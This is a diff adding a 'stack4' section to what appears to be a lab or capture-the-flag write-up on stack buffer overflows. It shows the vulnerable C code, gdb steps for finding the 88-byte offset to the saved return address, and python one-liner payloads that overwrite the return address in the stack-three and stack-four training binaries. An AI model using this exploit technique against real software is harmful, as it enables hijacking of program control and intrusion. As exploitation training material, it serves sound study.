@@ -47,3 +47,61 @@ objdump -d ./stack-three | grep complete_level
 0x40069d
 python -c 'print "A" * 64 + "\x9d\x06\x40"' | ./stack-three
 ```
+
+## stack4
+
+- In this challenge the buffer ovflow occurs in the start_level funtions which is called in the main() function:
+
+```
+
+void start_level() {
+  char buffer[64];
+  void *ret;
+
+  gets(buffer);
+
+  ret = __builtin_return_address(0);
+  printf("and will be returning to %p\n", ret);
+}
+
+int main(int argc, char **argv) {
+  printf("%s\n", BANNER);
+  start_level();
+}
+
+
+```
+
+- What we have to do is:
+  1- overflow the stack buffer until it reach the return address of strart_level() function
+  2- keep in mind all the functions returns addressess are saved on the stack.
+  3- the return address of the start_level will also be present on the stack.
+  
+- How to find the write amount of characters to overflow the buffer:
+  1- open the program in the gdb.
+  2- place the breakpoint after the gets() function.
+  3- fill the buffer with dummy data:
+	  ```
+	  run < <(python -c 'print("A" * 64)')
+	  ```
+  4- Now find the location of overflowed function:
+	  ```
+	  x/100x $rsp // rsp is the stack pointer it is the top most address of the stack
+	  ```
+  5- the above prompt will dump the address and data stored on the stack in form of hex.
+  6- The top left address will mostly likely show the overflowed buffer.
+  7- next step is to find the return address of start_level which could by find by:
+	  ```
+	  info frame // the <saved $rip=????> will be the return address of the start level function
+	  ```
+  8- To calculate the right amount of characters to reach the start_level return address one can subtract the address of overflowed buffer with the return address
+  of the start_level function.
+  
+	  ```
+	  0x7fffffffe4f8 - 0x7fffffffe4a0 = 0x58 
+	  which in decimal is = 88
+	  ```
+  9- Now to curate a payload:
+	  ```
+	  python -c 'print("A" * 88 + "\x1d\x06\x40")' | ./stack-four
+	  ```
